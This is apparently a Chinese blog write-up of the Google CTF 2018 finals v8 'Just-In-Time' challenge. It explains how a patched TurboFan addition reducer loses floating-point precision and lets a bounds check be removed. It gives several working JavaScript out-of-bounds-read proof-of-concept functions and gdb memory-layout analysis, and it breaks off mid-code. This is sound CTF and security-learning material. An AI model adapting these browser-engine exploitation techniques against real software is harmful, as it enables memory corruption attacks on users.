<h3 id="1-简介-2">1. 简介</h3>
<p>Google CTF 2018(final) Just-In-Time 是 v8 的一道基础题，适合用于v8即时编译的入门，其目标是执行<code>/usr/bin/gnome-calculator</code>以弹出计算器。在这里我们通过这道题目来学习一下v8的相关概念。</p>
<p>这道题的题解在安全客上有很多，但由于这是笔者初次接触 v8 的题，因此这次我们就详细讲一下其中的细节。</p>
<ul>
<li>题目来源 - <a href="https://ctftime.org/task/6982" target="_blank" rel="noopener">ctftime - task6982</a></li>
<li>Just-In-Time 官方附件及其exp - <a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time" target="_blank" rel="noopener">github</a></li>
</ul>
<h3 id="2-环境搭建">2. 环境搭建</h3>
<p>题目给的附件（ctftime中的附件，不是github上的附件）内含一个已编译好的chromium和两个patch文件。</p>
<ul>
<li><code>nosandbox.patch</code> : 该文件用于关闭renderer的沙箱机制。</li>
<li><code>addition-reducer.patch</code> : 本题的重头戏。</li>
<li><code>chromium</code> ：版本号为<code>70.0.3538.9</code>的二进制包（已打patch）</li>
</ul>
<p>不过由于笔者已经搭了v8的环境，因此决定采用源码编译的方式来编译出一个v8，这样的好处是<strong>可以更方便的进行调试</strong>。该题的v8版本为<strong>7.0.276.3</strong>，可以通过<code>chrome://version</code>来获取，或者去<a href="https://omahaproxy.appspot.com/" target="_blank" rel="noopener">OmahaProxy CSV Viewer</a>中查询。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开代理</span></span><br><span class="line">sudo service privoxy start</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="comment"># 切换chromium版本</span></span><br><span class="line"><span class="built_in">cd</span> v8/</span><br><span class="line">git checkout 7.0.276.3 <span class="comment"># 如果需要force，则添加-f参数。gclient同样如此。</span></span><br><span class="line">gclient sync <span class="comment"># 这一步需要代理（很重要）,需要N久,取决网速。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gclient sync完成后再打个patch</span></span><br><span class="line">git apply ../../../CTF/GoogleCTF2018_Just-In-Time/addition-reducer.patch</span><br><span class="line"><span class="comment"># 设置一下编译参数</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"><span class="comment"># 设置允许优化checkbounds</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"v8_untrusted_code_mitigations = false"</span> &gt;&gt; out.gn/x64.debug/args.gn</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么要设置<code>v8_untrusted_code_mitigations = false</code>，请查看上面关于<code>SimplifiedLoweringPhase</code>中checkbounds优化的简单讲解。</p>
<p>这里可能是因为出题者忘记给出v8的编译参数了，否则默认的编译参数将<strong>无法利用漏洞</strong>。</p>
</blockquote>
<h3 id="3-漏洞成因">3. 漏洞成因</h3>
<ul>
<li>
<p>新打的patch将在turboFan中的<code>TypedLoweringPhase</code>中添加了一种优化方式。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">DuplicateAdditionReducer::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNumberAdd:</span><br><span class="line">      <span class="keyword">return</span> ReduceAddition(node);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">DuplicateAdditionReducer::ReduceAddition</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), <span class="number">0</span>);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), <span class="number">0</span>);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  Node* left = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* right = NodeProperties::GetValueInput(node, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* parent_left = NodeProperties::GetValueInput(left, <span class="number">0</span>);</span><br><span class="line">  Node* parent_right = NodeProperties::GetValueInput(left, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> const1 = OpParameter&lt;<span class="keyword">double</span>&gt;(right-&gt;op());</span><br><span class="line">  <span class="keyword">double</span> const2 = OpParameter&lt;<span class="keyword">double</span>&gt;(parent_right-&gt;op());</span><br><span class="line">  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line"></span><br><span class="line">  NodeProperties::ReplaceValueInput(node, parent_left, <span class="number">0</span>);</span><br><span class="line">  NodeProperties::ReplaceValueInput(node, new_const, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Changed(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该优化方式将优化诸如<code>x + 1 + 2</code>这类的表达式为<code>x + 3</code>，即以下的Case4：</p>
<p><img src="/2021/01/v8-turboFan/schema_vuln_ctf.png" alt="img"></p>
</li>
<li>
<p>但是，还记得我们之前所提到的，NumberConstant的内部实现使用的是<code>double</code>类型。这就意味着这样的优化可能存在精度丢失。举个例子：</p>
<p><img src="/2021/01/v8-turboFan/JStest.png" alt="img"></p>
<p>即，<code>x + 1 + 1</code>不一定会等于<code>x + 2</code>！所以这种优化是存在问题的。</p>
</li>
<li>
<p>这是为什么呢？原因是浮点数的IEEE764标准。当一个浮点数越来越大时，有限的空间只能保留高位的数据，因此一旦浮点数的值超过某个界限时，低位数值将被舍弃，此时数值不能全部表示，存在精度丢失。</p>
<p>而这个界限正是 $2^{53}-1 = 9007199254740991$，即上图中的<code>MAX_sAFE_INTEGER</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下是double结构的9007199254740991值，可以看到正好是double结构所能存放的最大整数。</span></span><br><span class="line">+------+--------------+------------------------------------------------------+‭</span><br><span class="line">| sign |    exponent  |                fraction                              |</span><br><span class="line">+------+--------------+------------------------------------------------------+</span><br><span class="line">|   <span class="number">0</span>  |  <span class="number">00000000001</span> | <span class="number">1111111111111111111111111111111111111111111111111111</span>‬ |</span><br><span class="line">+------+--------------+------------------------------------------------------+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于<code>x + 1 + 1 &lt;= x + 2</code>，因此某个<code>NumberAdd</code>结点的<code>Type</code>，也就是<strong>其Range将会小于该结点本身的值</strong> 。例如</p>
<ul>
<li><code>9007199254740992</code> 连续两次 <strong>+1</strong> 后，由于精度丢失，导致最后一个<code>NumberAdd</code>结点的Type为<code>Range(9007199254740992,9007199254740992)</code>。</li>
<li>但由于执行了patch中的优化，导致最后一个加法操作实际的结果为<code>9007199254740994</code>，大于Range的最大值。</li>
<li>因此，如果使用这个结果值来访问数组的话，可能存在越界读写的问题，因为若预期index小于length的最小范围时，checkBounds结点将会被优化，此时比<strong>预期index</strong> 范围更大的 <strong>实际index</strong> 很有可能成功越界。</li>
</ul>
</li>
</ul>
<h3 id="4-漏洞利用">4. 漏洞利用</h3>
<h4 id="a-OOB">a. OOB</h4>
<h5 id="1-构造POC">1) 构造POC</h5>
<ul>
<li>
<p>我们先试一下POC</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>]; <span class="comment">// length =&gt; Range(5, 5)</span></span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    <span class="comment">// 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)</span></span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(9007199254740991, 9007199254740992)</span></span><br><span class="line"><span class="comment">        编译：Range(9007199254740991, 9007199254740994)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(2, 3)</span></span><br><span class="line"><span class="comment">        编译：Range(2, 5)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>Type后的结果如下，可以看到checkbounds的检查可以通过：</p>
<p><img src="/2021/01/v8-turboFan/poc_1.png" alt="img"></p>
<p>因此该checkbounds将在<code>SimplifiedLoweringPhase</code>中被优化：</p>
<p><img src="/2021/01/v8-turboFan/poc_2.png" alt="img"></p>
<p>输出的结果如下：</p>
<blockquote>
<p>注：输出结果中的<code>DuplicateAdditionReducer::ReduceAddition Called/Success</code>，是打patch后的输出内容，在原v8中没有该输出。</p>
</blockquote>
<p><img src="/2021/01/v8-turboFan/ctfoutput1.png" alt="img"></p>
<p>可以看到，成功将两个+1操作优化为+2，并在最末尾处成功<strong>越界读取</strong>到一个数组外的元素。</p>
</li>
<li>
<p>这里需要说一下构建poc可能存在的问题：</p>
<ul>
<li>
<p>POC1：<strong>无 if 分支</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="comment">// 这里没有使用上面if xxx这样的语句，直接一个整数赋值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// let t = Number.MAX_SAFE_INTEGER + 1; </span></span><br><span class="line">    <span class="keyword">let</span> t = <span class="number">9007199254740992</span>; </span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：由于函数中常数与常数相加减，因此在执行<code>TypedLoweringPhase</code>中的<code>ConstantFoldingReducer</code>时，三个算数表达式会直接优化为一个常数，这样就没办法执行<code>DuplicateAdditionReducer</code>。</p>
<p><img src="/2021/01/v8-turboFan/poc1.png" alt="img"></p>
<p><strong>解决方法</strong>：使用一个<code>if</code>分支，这样就可以通过<code>phi</code>结点来间接设置<code>Range</code>。</p>
</li>
</ul>
<blockquote>
<p>以下是一些玄学问题。</p>
</blockquote>
<ul>
<li>
<p>POC2：<strong>使用<code>Number.MAX_SAFE_INTEGER</code></strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">        : <span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：在<code>GraphBuilderPhase</code>中，type feedback推测目标函数的参数只会为<code>1</code>，因此turboFan推测函数中的条件判断式 <strong>“恒”成立</strong> ，故在<code>InliningPhase</code>中优化<code>merge</code>结点，使得变量<code>t</code>始终为一个常数。</p>
<p><img src="/2021/01/v8-turboFan/poc2_1.png" alt="img"></p>
<p>之后就执行<code>TypedLoweringPhase</code>中的<code>ConstantFoldingReducer</code>再次将其优化为一个常数，以至于无法执行<code>DuplicateAdditionReducer</code>优化。</p>
<p>通过turbolizer我们可以看出，若判断条件为真，则将优化好的结果输出；若判断条件为假，则说明type feedback出现错误，需要执行deopt。</p>
<p><img src="/2021/01/v8-turboFan/poc2.png" alt="img"></p>
<blockquote>
<p>至于为什么先前的poc不会优化merge结点，而当前这个poc会优化merge结点，</p>
<p>这个问题仍然需要进一步探索。</p>
</blockquote>
<p><strong>解决方法</strong>：</p>
<ol>
<li>
<p>不同时在 if 语句的两个分支处使用<code>Number.MAX_SAFE_INTEGER</code></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">        <span class="comment">// 修改了此处</span></span><br><span class="line">        : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在执行<code>%OptimizeFunctionOnNextCall</code>前，使函数调用传入的参数<strong>不单一</strong>:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">          : <span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">0</span>));  <span class="comment">// 添加了此行</span></span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<p>POC3：<strong>不使用<code>let/var/const</code>修饰词</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 错误：arr前没有let、var或者const</span></span><br><span class="line">    arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="comment">// 错误：t 前没有let</span></span><br><span class="line">    t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：经过gdb动态调试可知，若数组前没有修饰词，则<code>CheckBounds</code>的上一个结点<code>LoadField</code>结点将不会被<code>LoadEliminationPhase</code>优化，这样使得数组<code>length</code>结点的范围最大值为134217726，最后导致无法成功优化<code>CheckBounds</code>结点：</p>
<p><img src="/2021/01/v8-turboFan/poc3.png" alt="img"></p>
<p>同时，若变量<code>t</code>前没有修饰词，则越界的<code>add</code>操作将被<code>check</code>出，进而设置值为<code>inf/NaN</code>，之后的减法就无法计算出我们所期望的Range值：</p>
<p><img src="/2021/01/v8-turboFan/poc3_1.png" alt="img"></p>
<p><strong>解决方法</strong>：添加修饰词。</p>
<blockquote>
<p>因为没有修饰词 let / var 的变量都是全局变量，而 Load Elimination 的优化对作用域有一定的要求，因此全局变量的 LoadField 结点将不会被优化。</p>
</blockquote>
</li>
<li>
<p>POC4：使用<strong>整数数组</strong></p>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：执行<code>console.log</code>时崩溃：</p>
<p><img src="/2021/01/v8-turboFan/poc4.png" alt="img"></p>
<p><strong>解决方法</strong>：更改数组类型。经过一番测试，发现貌似只能改成<strong>浮点数数组</strong>，改成其他类型的输出都会<strong>崩溃</strong>。</p>
</li>
<li>
<p>小结：构造POC需要重复多次 <strong>修改代码 =&gt; 观察输出 =&gt; 从turbolizer中查看结点图 =&gt; 分析错误原因</strong> 这个过程，有时还需要给源码打patch和上gdb调试，需要耐心。</p>
</li>
</ul>
</li>
<li>
<p>构造POC时，只需要关注两个重点：</p>
<ol>
<li>
<p>能否成功执行<code>DuplicateAdditionReducer</code>优化</p>
</li>
<li>
<p>能否成功优化<code>CheckBounds</code>结点。</p>
</li>
</ol>
<p>如果这两个条件都满足，那基本上构建出的POC可以OOB了。</p>
</li>
</ul>
<h5 id="2-越界读取">2) 越界读取</h5>
<p>POC有了，那我们试着看一下越界读取到的内存位置，</p>
<p>不出以外的话应该是最后一个元素<code>5.5</code>的下一个8位数据：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>) + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[t]);</span><br><span class="line">    <span class="comment">// 将arr数组详细信息输出</span></span><br><span class="line">    %DebugPrint(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">f(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 下断点，使v8在gdb中暂停</span></span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>启动GDB，可以看到 d8 自动暂停执行：</p>
<p><img src="/2021/01/v8-turboFan/gdbtrap.png" alt="img"></p>
<p>之后我们可以找到DebugPrint出的数组内存地址：</p>
<p><img src="/2021/01/v8-turboFan/debugprint1.png" alt="img"></p>
<p>每个Object内部都有一个map，该map用于描述对应结构的相关属性。其中包括了当前Object的实例大小，以及一些供GC使用的信息。通过上面的输出，我们可以得到，当前JSArray的实例大小只有32字节。</p>
<blockquote>
<p>map的具体信息请查阅源码 src/objects/map.h 中的注释。</p>
</blockquote>
<p>因此，数组中的其他元素肯定存放于另一个数组，而这个数组的类型为<code>FixedDoubleArray</code>，其地址存放于JSArray中。</p>
<blockquote>
<p>需要注意的是：v8 中的指针值大多被打上了tag，以便于区分某个值是pointer还是smi。</p>
<p>因此在gdb使用某个地址时，最低位需要手动置0。</p>
</blockquote>
<p>以下是某个 JSArray 的内存布局：</p>
<p><img src="/2021/01/v8-turboFan/debugprint2.png" alt="img"></p>
<p>注意到 JSArray中，第四个8字节数据（即上图中的<code>0x0000000500000000</code>）存放的是当前数组的length（5），即便数组元素并没有存放在当前这块内存上。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/js-array.h</span></span><br><span class="line"><span class="comment">// static const int v8::internal::JSObject::kHeaderSize = 24</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> int kLengthOffset = JSObject::kHeaderSize;</span><br></pre></td></tr></table></figure>
<p>回到刚刚的话题，数组的值被存放在<code>FixedDoubleArray</code>中，因此我们输出一下内存布局看看：</p>
<p><img src="/2021/01/v8-turboFan/debugprint3.png" alt="img"></p>
<p>可以看到，它越界读取到的数据与先前猜测的一致，即最后一个元素的下一个8字节数据。</p>
<p>同时我们还可以从 gdb 的输出中注意到，一个 JSArray的length 即在 JSArray 中保存，又在 FixedDoubleArray 中存放着，这个也可以在源码中直接定位到操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/objects/js-array-inl.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JSArray::SetContent</span><span class="params">(Handle&lt;JSArray&gt; <span class="built_in">array</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Handle&lt;FixedArrayBase&gt; storage)</span> </span>&#123;</span><br><span class="line">  EnsureCanContainElements(<span class="built_in">array</span>, storage, storage-&gt;length(),</span><br><span class="line">                           